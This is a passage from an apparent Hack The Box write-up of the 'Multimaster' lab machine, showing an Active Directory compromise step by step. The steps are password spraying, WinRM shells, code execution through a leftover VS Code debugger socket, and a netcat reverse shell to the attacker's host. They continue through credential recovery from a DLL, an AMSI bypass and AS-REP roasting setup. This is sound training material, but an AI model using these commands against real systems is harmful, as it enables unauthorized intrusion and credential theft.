+[+] Found account [03116]  MEGACORP\jsmmons                              
+[+] Found account [03117]  MEGACORP\pmartin                              
+[+] Found account [03119]  MEGACORP\Developers
+</span></code></pre></div></div>
+<h3 id="test-passwords-with-domain-users">Test Passwords with Domain Users</h3>
+<p>I added all these users to a file and went back to <code class="language-plaintext highlighter-rouge">crackmapexec</code> to check if the passwords I already have work with any of these users:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>crackmapexec smb 10.10.10.179 <span class="nt">-u</span> dom_users <span class="nt">-p</span> passwords <span class="nt">--continue-on-success</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (SMBv1:True)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\MULTIMASTER$:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\MULTIMASTER$:finance1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\MULTIMASTER$:banking1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\DnsAdmins:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\DnsAdmins:finance1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\DnsAdmins:banking1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\DnsUpdateProxy:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\DnsUpdateProxy:finance1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\DnsUpdateProxy:banking1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\svc-nas:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\svc-nas:finance1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\svc-nas:banking1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\Privileged IT Accounts:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\Privileged IT Accounts:finance1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\Privileged IT Accounts:banking1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\tushikikatomo:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logsuccess">[+]</span><span class="go"> MEGACORP\tushikikatomo:finance1 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\tushikikatomo:banking1 STATUS_ACCESS_DENIED 
+...[snip]...
+</span></code></pre></div></div>
+<p>There’s one success: <code class="language-plaintext highlighter-rouge">MEGACORP\tushikikatomo:finance1</code>.</p>
+<p>With these new creds, I have access to three shares:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>crackmapexec smb 10.10.10.179 <span class="nt">-u</span> tushikikatomo <span class="nt">-p</span> finance1 <span class="nt">--shares</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (SMBv1:True)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logsuccess">[+]</span><span class="go"> MEGACORP\tushikikatomo:finance1 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logsuccess">[+]</span><span class="go"> Enumerated shares
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">Share           Permissions     Remark</span><span class="err">
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">-----           -----------     ------
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">ADMIN$                          Remote Admin
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">C$                              Default share
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">Development                     
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">dfs             READ            
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">E$                              Default share
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">IPC$                            Remote IPC
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">NETLOGON        READ            Logon server share 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-shareenum">SYSVOL          READ            Logon server share
+</span></code></pre></div></div>
+<h3 id="winrm">WinRM</h3>
+<p>I also have access to a shell over WinRM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>evil-winrm <span class="nt">-u</span> <span class="s2">"MEGACORP</span><span class="se">\t</span><span class="s2">ushikikatomo"</span> <span class="nt">-p</span> finance1 <span class="nt">-i</span> 10.10.10.179
+<span class="go">
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>And <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">user.txt</span><span class="w">
+</span><span class="go">8264c025************************
+</span></code></pre></div></div>
+<h2 id="priv-tushikikatomo--cyork">Priv: tushikikatomo –&gt; cyork</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>I wanted to check out the web stuff, but this user doesn’t have access to <code class="language-plaintext highlighter-rouge">\inetpub\wwwroot</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\inetpub\wwwroot&gt;</span><span class="w"> </span><span class="n">dir</span><span class="w">
+</span><span class="go">Access to the path 'C:\inetpub\wwwroot' is denied.
+At line:1 char:1
++ dir
++ ~~~
+    + CategoryInfo          : PermissionDenied: (C:\inetpub\wwwroot:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+</span></code></pre></div></div>
+<p>After looking around the users home directory, I turned to looking at installed programs, and in enumerating them, one jumped out as not normal on HTB machines:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Program Files (x86)\Microsoft Visual Studio 10.0&gt;</span><span class="w"> </span><span class="n">dir</span><span class="w">
+</span><span class="go">
+
+    Directory: C:\Program Files (x86)\Microsoft Visual Studio 10.0
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/7/2020   7:26 PM                Common7
+</span></code></pre></div></div>
+<h3 id="cef-debugging-background">CEF Debugging Background</h3>
+<p><a href="https://twitter.com/taviso/status/1182418347759030272">This Tweet</a> from Travis Ormandy explains the situation:</p>
+<blockquote class="twitter-tweet"><p dir="ltr" lang="en">It seems like everyone shipping Electron or CEF has made the mistake of leaving the debugger enabled at some point. I made a tiny command line application you can use to   check. 🐞 <a href="https://t.co/BIceqkcYJq">https://t.co/BIceqkcYJq</a></p>— Tavis Ormandy (@taviso) <a href="https://twitter.com/taviso/status/1182418347759030272?ref_src=twsrc%5Etfw">October 10, 2019</a></blockquote>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8"&gt;&lt;/script&gt; 
+</code></pre></div></div>
+<p>In the linked <a href="https://github.com/taviso/cefdebug">GitHub</a>, Travis shows how to check for the existence of these sockets, as well as how to get execution using this technique. Visual Studio Code is built on Electron.</p>
+<h3 id="poc">POC</h3>
+<p>I’ll grab the <code class="language-plaintext highlighter-rouge">.exe</code> from the releases page, and upload it using my <code class="language-plaintext highlighter-rouge">impacket-smbserver</code>. Then running it shows the existence of a debug socket:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\cefdebug.exe</span><span class="w">
+</span><span class="go">[2020/04/01 03:19:43:2657] U: There are 5 tcp sockets in state listen.
+    + CategoryInfo          : NotSpecified: ([2020/04/01 03:...n state listen.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2020/04/01 03:20:03:7841] U: There were 3 servers that appear to be CEF debuggers.
+[2020/04/01 03:20:03:9873] U: ws://127.0.0.1:9102/1243eb8e-cffa-4cae-b922-5fa98b74e779
+[2020/04/01 03:20:03:9873] U: ws://127.0.0.1:41509/967dc3c1-4c31-41fc-b9a0-b3dc8a41df33
+[2020/04/01 03:20:03:9873] U: ws://127.0.0.1:3090/1fbbbd53-07f7-4e44-8d56-d80a9dc606a7
+</span></code></pre></div></div>
+<p>Note, for some reason with this Evil-WinRM shell, it throws those two lines of errors each time I run <code class="language-plaintext highlighter-rouge">cefdebug.exe</code>. It seems to work fine anyway. Over a <code class="language-plaintext highlighter-rouge">nc</code> shell, it doesn’t throw those errors. Your mileage may vary. I’ll not show them the rest of the post.</p>
+<p>Those sockets only last a few seconds, so I’ll have to act quickly to make use of them. As the socket urls change in the examples I show, each time I ran <code class="language-plaintext highlighter-rouge">cefdebug.exe</code> with no args to get the current sockets, and then the commands shown.</p>
+<p>To show I can run something, I’ll get the version:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\cefdebug.exe</span><span class="w"> </span><span class="nt">--code</span><span class="w"> </span><span class="s2">"process.version"</span><span class="w"> </span><span class="nt">--url</span><span class="w"> </span><span class="nx">ws://127.0.0.1:14393/5a73a31b-903d-41e8-b18d-9fb422e89234</span><span class="w">
+</span><span class="go">[2020/04/01 03:24:14:1537] U: &gt;&gt;&gt; process.version
+[2020/04/01 03:24:14:1557] U: &lt;&lt;&lt; v10.11.0
+</span></code></pre></div></div>
+<p>I can also see who is running with <code class="language-plaintext highlighter-rouge">whoami</code>. I tried to pick a directory that any user would be able to write to:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\cefdebug</span><span class="w"> </span><span class="nt">--code</span><span class="w"> </span><span class="s2">"process.mainModule.require('child_process').exec('whoami &gt; C:\windows\system32\spool\drivers\color\0xdf')"</span><span class="w"> </span><span class="nt">--url</span><span class="w"> </span><span class="nx">ws://127.0.0.1:64493/fd4b0ffa-a388-40da-b01a-62709102094b</span><span class="w">
+</span><span class="go">[2020/04/01 03:28:40:0773] U: &gt;&gt;&gt; process.mainModule.require('child_process').exec('whoami &gt; C:\\windows\system32\spool\drivers\color\0xdf')
+[2020/04/01 03:28:40:0930] U: &lt;&lt;&lt; ChildProcess
+
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">C:\windows\system32\spool\drivers\color\0xdf</span><span class="w">
+</span><span class="go">megacorp\cyork
+</span></code></pre></div></div>
+<h3 id="shell">Shell</h3>
+<p>I’ll upload <code class="language-plaintext highlighter-rouge">nc.exe</code>, as I’m working through the 32-bit Visual Studio Code. Now spawn it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\cefdebug</span><span class="w"> </span><span class="nt">--code</span><span class="w"> </span><span class="s2">"process.mainModule.require('child_process').exec('C:\\programdata\\nc.exe 10.10.14.19 443 -e cmd')"</span><span class="w"> </span><span class="nt">--url</span><span class="w"> </span><span class="nx">ws://127.0.0.1:60404/830991c3-0f17-4025-9b2c-a0ef1c8675f2</span><span class="w">
+</span><span class="go">[2020/04/01 03:39:52:7113] U: &gt;&gt;&gt; process.mainModule.require('child_process').exec('C:\\programdata\\nc.exe 10.10.14.19 443 -e cmd')
+[2020/04/01 03:39:52:7153] U: &lt;&lt;&lt; ChildProcess
+</span></code></pre></div></div>
+<p>And get a shell:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>rlwrap nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.179.
+Ncat: Connection from 10.10.10.179:50159.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\Program Files\Microsoft VS Code&gt;</span><span class="nb">whoami</span>
+<span class="go">megacorp\cyork
+</span></code></pre></div></div>
+<p>This was super finicky. It just didn’t work sometimes. But eventually it did.</p>
+<h2 id="priv-cyork--sbauer">Priv: cyork –&gt; sbauer</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>cyork does have access to the web directory. I missed it the first time I was there, but eventually I noticed a very custom dll in <code class="language-plaintext highlighter-rouge">\inetpub\wwwroot\bin\</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\inetpub\wwwroot\bin&gt;</span><span class="nb">dir</span>
+<span class="go"> Volume in drive C has no label.
+ Volume Serial Number is 5E12-F84E                                                                                
+                                                         
+ Directory of C:\inetpub\wwwroot\bin
+                                                         
+01/07/2020  10:28 PM    &lt;DIR&gt;          .
+01/07/2020  10:28 PM    &lt;DIR&gt;          ..
+02/21/2013  08:13 PM           102,912 Antlr3.Runtime.dll 
+02/21/2013  08:13 PM           431,616 Antlr3.Runtime.pdb 
+05/24/2018  01:08 AM            40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
+07/24/2012  11:18 PM            45,416 Microsoft.Web.Infrastructure.dll
+01/09/2020  05:13 AM            13,824 MultimasterAPI.dll
+01/09/2020  05:13 AM            28,160 MultimasterAPI.pdb 
+02/17/2018  09:14 PM           664,576 Newtonsoft.Json.dll
+01/07/2020  10:28 PM    &lt;DIR&gt;          roslyn
+11/28/2018  12:30 AM           178,808 System.Net.Http.Formatting.dll
+11/28/2018  12:28 AM            27,768 System.Web.Cors.dll
+01/27/2015  03:34 PM           139,976 System.Web.Helpers.dll
+11/28/2018  12:31 AM            39,352 System.Web.Http.Cors.dll
+11/28/2018  12:31 AM           455,096 System.Web.Http.dll
+01/31/2018  11:49 PM            77,520 System.Web.Http.WebHost.dll
+01/27/2015  03:32 PM           566,472 System.Web.Mvc.dll 
+02/11/2014  02:56 AM            70,864 System.Web.Optimization.dll
+01/27/2015  03:32 PM           272,072 System.Web.Razor.dll
+01/27/2015  03:34 PM            41,672 System.Web.WebPages.Deployment.dll
+01/27/2015  03:34 PM           211,656 System.Web.WebPages.dll
+01/27/2015  03:34 PM            39,624 System.Web.WebPages.Razor.dll
+07/17/2013  04:33 AM         1,276,568 WebGrease.dll
+              20 File(s)      4,724,032 bytes
+               3 Dir(s)  19,370,094,592 bytes free
+</span></code></pre></div></div>
+<p>I’ll copy <code class="language-plaintext highlighter-rouge">MultimasterAPI.dll</code> back to my machine over SMB.</p>
+<h3 id="multimasterapidll">MultimasterAPI.dll</h3>
+<p>The file is a .NET binary:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>file MultimasterAPI.dll 
+<span class="go">MultimasterAPI.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
+</span></code></pre></div></div>
+<p>But before opening it in DNSpy, I’ll run <code class="language-plaintext highlighter-rouge">strings</code>. It’s important to remember for Windows binaries to run with and without <code class="language-plaintext highlighter-rouge">-el</code> to capture the 16 bit character strings. There’s one that jumps out when I run with <code class="language-plaintext highlighter-rouge">-el</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
+</code></pre></div></div>
+<p>That looks like a database connection string.</p>
+<h3 id="test-creds-1">Test Creds</h3>
+<p>In what’s becoming a theme for this box, I’ll check the creds with <code class="language-plaintext highlighter-rouge">crackmapexec</code> against my user list to see if it works for any, and it finds one:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>crackmapexec smb 10.10.10.179 <span class="nt">-u</span> dom_users <span class="nt">-p</span> <span class="s1">'D3veL0pM3nT!'</span> <span class="nt">--continue-on-success</span>
+<span class="go">...[snip]...
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logsuccess">[+]</span><span class="go"> MEGACORP\sbauer:D3veL0pM3nT!
+...[snip]...
+</span></code></pre></div></div>
+<h3 id="winrm-1">WinRM</h3>
+<p>This user can also use WinRM to get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>evil-winrm <span class="nt">-u</span> <span class="s1">'MEGACORP\sbauer'</span> <span class="nt">-p</span> <span class="s1">'D3veL0pM3nT!'</span> <span class="nt">-i</span> 10.10.10.179
+<span class="go">
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\sbauer\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="priv-sbauer--jordan">Priv: sbauer –&gt; jordan</h2>
+<h3 id="collect-bloodhound">Collect Bloodhound</h3>
+<p>Given this is an active directory environment, it’s time I ran <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>. I’ll copy <code class="language-plaintext highlighter-rouge">SharpHound.exe</code> into my SMB share and then onto MultiMaster:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">\\10.10.14.19\share\SharpHound.exe</span><span class="w"> </span><span class="o">.</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">-c all</code> for all collections methods, and it creates a <code class="language-plaintext highlighter-rouge">.zip</code> output file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w">
+</span><span class="go">----------------------------------------------
+Initializing SharpHound at 4:35 AM on 4/1/2020
+----------------------------------------------
+
+Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container                                                              
+
+[+] Creating Schema map for domain MEGACORP.LOCAL using path CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
+[+] Cache File not Found: 0 Objects in cache
+
+[+] Pre-populating Domain Controller SIDS
+Status: 0 objects finished (+0) -- Using 19 MB RAM
+Status: 94 objects finished (+94 ì)/s -- Using 27 MB RAM
+Enumeration finished in 00:00:00.6367272
+Compressing data to .\20200401043525_BloodHound.zip
+You can upload this file directly to the UI
+
+SharpHound Enumeration Completed at 4:35 AM on 4/1/2020! Happy Graphing! 
+</span></code></pre></div></div>
+<p>I’ll move that back to my box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">move</span><span class="w"> </span><span class="nx">20200401043525_BloodHound.zip</span><span class="w"> </span><span class="nx">\\10.10.14.19\share\</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="bloodhound-analysis">BloodHound Analysis</h3>
+<p>Loading that into Bloodhound, I’ll start by bringing up the three accounts I’ve owned and marking them as such (right click and select Mark as Owned). Then I’ll run the query “Shortest Paths to High Value Targets”, and it returns this:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20200401144617068.png"><img alt="image-20200401144617068" src="https://0xdfimages.gitlab.io/img/image-20200401144617068.png"/><em>Click for full size image</em></a></p>
+<p>It’s a bit of a mess, but in looking at it, two of the accounts I’ve owned are on there. tushikikatomo is there just because they can PSRemote. But sbauer has GenericWrite on jorden, who is a member of a high priority group, Server Operators. That seems like a valid path.</p>
+<h3 id="bypass-amsi">Bypass AMSI</h3>
+<p>Taking advantage of the relationships outlined by BloodHound is most easily done with <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> from <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>. I copy it into my SMB share and onto Multimaster, but when I try to load it, it is rejected by the AV:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">\\10.10.14.19\share\PowerView.ps1</span><span class="w"> </span><span class="o">.</span><span class="w">                  
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerView.ps1</span><span class="w">                    
+</span><span class="go">At C:\programdata\PowerView.ps1:1 char:1                                                 
++ #requires -version 2                                                                   
++ ~~~~~~~~~~~~~~~~~~~~                                                                   
+This script contains malicious content and has been blocked by your antivirus software.  
+At C:\programdata\PowerView.ps1:1 char:1                                                 
++ #requires -version 2                                                                   
++ ~~~~~~~~~~~~~~~~~~~~                                                                   
+    + CategoryInfo          : ParserError: (:) [], ParseException                        
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent 
+</span></code></pre></div></div>
+<p><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> has an AMSI bypass built in. It’s a bit weird in that you have to run <code class="language-plaintext highlighter-rouge">menu</code> first, and then the command, or it errors out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Bypass-4MSI</span><span class="w">                                              
+</span><span class="go">The term 'Bypass-4MSI' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify th
+at the path is correct and try again.
+At line:1 char:1
++ Bypass-4MSI
++ ~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Bypass-4MSI:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException 
+    
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">menu</span><span class="w">
+</span><span class="go">
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/ 
+              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
+  
+[+] Bypass-4MSI 
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Bypass-4MSI</span><span class="w">                                               
+</span><span class="go">[+] Patched! :D
+</span></code></pre></div></div>
+<p>Once I do that, I can load <code class="language-plaintext highlighter-rouge">PowerView.ps1</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">                             
+</span></code></pre></div></div>
+<h3 id="get-as-rep-hash">Get AS-REP Hash</h3>
+<p>In <a href="/2020/03/21/htb-forest.html#as-rep-roasting">Forest</a> I used AS-REP Roasting to get a foothold on the machine. Here, because I can edit the attributes for the user, I’m going to enable the <code class="language-plaintext highlighter-rouge">DONT_REQ_PREAUTH</code> flags on the jorden account, and then get that same hash and crack it.</p>
+<p>If I look at what is currently set for the jorden user, it’s the <code class="language-plaintext highlighter-rouge">NORMAL_ACCOUNT</code> and <code class="language-plaintext highlighter-rouge">DONT_EXPIRE_PASSWORD</code> flags:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nx">jorden</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertFrom-UACValue</span><span class="w">
+</span><span class="go">
+Name                           Value
+----                           -----
+NORMAL_ACCOUNT                 512
+DONT_EXPIRE_PASSWORD           65536
+</span></code></pre></div></div>
+<p>For each user, there’s a 4-byte (64-bit) word that represents <a href="http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm">various flags for userAccountControl</a>. The bit for <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code> is 4194304. So I can XOR that bit (flip it to on) with the following command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">jorden</span><span class="w"> </span><span class="o">-XOR</span><span class="w"> </span><span class="p">@{</span><span class="nx">useraccountcontrol</span><span class="o">=</span><span class="mi">4194304</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span><span class="go">Verbose: [Get-DomainSearcher] search base: LDAP://DC=MEGACORP,DC=LOCAL
+Verbose: [Get-DomainObject] Get-DomainObject filter string: (&amp;(|(|(samAccountName=jorden)(name=jorden)(displayname=jorden))))
+Verbose: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'jorden'
